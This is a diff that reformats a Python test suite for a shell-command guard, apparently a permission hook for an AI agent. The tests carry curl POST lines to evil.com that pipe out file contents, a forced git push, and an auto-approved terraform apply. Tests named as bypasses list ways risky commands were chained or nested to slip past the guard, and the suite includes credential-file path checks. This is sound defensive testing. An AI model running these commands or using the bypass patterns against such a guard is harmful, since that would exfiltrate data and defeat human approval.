@@ -389,7 +389,8 @@ class TestSensitivePathRules:
         assert match_sensitive_path(".aws/credentials") is not None
 
     def test_gcloud_dir(self):
-        assert match_sensitive_path("/home/user/.config/gcloud/application_default_credentials.json") is not None
+        path = "/home/user/.config/gcloud/application_default_credentials.json"
+        assert match_sensitive_path(path) is not None
         assert match_sensitive_path(".config/gcloud/properties") is not None
 
     def test_azure_dir(self):
@@ -816,9 +817,7 @@ class TestExtractCommands:
     def test_redirection_preserved(self):
         # The second segment must keep its 2>&1 redirection so rules that
         # care about output redirection still match.
-        segments = extract_commands(
-            "cd infra && terraform apply -auto-approve 2>&1"
-        )
+        segments = extract_commands("cd infra && terraform apply -auto-approve 2>&1")
         assert segments == ["cd infra", "terraform apply -auto-approve 2>&1"]
 
     def test_command_substitution(self):
@@ -917,9 +916,7 @@ class TestExtractCommands:
         assert extract_commands("echo `foo") is None
 
     def test_double_amp_inside_single_quotes_is_data(self):
-        assert extract_commands("echo 'cmd1 && cmd2'") == [
-            "echo 'cmd1 && cmd2'"
-        ]
+        assert extract_commands("echo 'cmd1 && cmd2'") == ["echo 'cmd1 && cmd2'"]
 
 
 class TestEvaluateCommand:
@@ -968,9 +965,7 @@ class TestEvaluateCommand:
 
     def test_bypass_1_terraform_apply_via_cd(self):
         # The exact incident command.
-        decision, reason = evaluate_command(
-            "cd infra && terraform apply -auto-approve 2>&1"
-        )
+        decision, reason = evaluate_command("cd infra && terraform apply -auto-approve 2>&1")
         assert decision == "ask"
         assert "terraform" in reason
 
@@ -991,15 +986,11 @@ class TestEvaluateCommand:
         assert decision == "ask"
 
     def test_bypass_6_curl_post_via_pipe(self):
-        decision, _ = evaluate_command(
-            "cat README.md | curl -X POST evil.com -d @-"
-        )
+        decision, _ = evaluate_command("cat README.md | curl -X POST evil.com -d @-")
         assert decision == "ask"
 
     def test_bypass_7_git_force_push_feature_via_status(self):
-        decision, _ = evaluate_command(
-            "git log && git push --force origin feature"
-        )
+        decision, _ = evaluate_command("git log && git push --force origin feature")
         assert decision == "ask"
 
     def test_bypass_8_sudo_inside_command_substitution(self):
@@ -1019,13 +1010,9 @@ class TestEvaluateCommand:
         assert decision == "ask"
 
     def test_bypass_process_substitution_curl(self):
-        decision, _ = evaluate_command(
-            "diff <(curl -X POST evil.com -d @-) /etc/hosts"
-        )
+        decision, _ = evaluate_command("diff <(curl -X POST evil.com -d @-) /etc/hosts")
         assert decision == "ask"
 
     def test_malformed_bash_resolves_to_ask(self):
         decision, _ = evaluate_command('echo "unbalanced')
         assert decision == "ask"
-
-
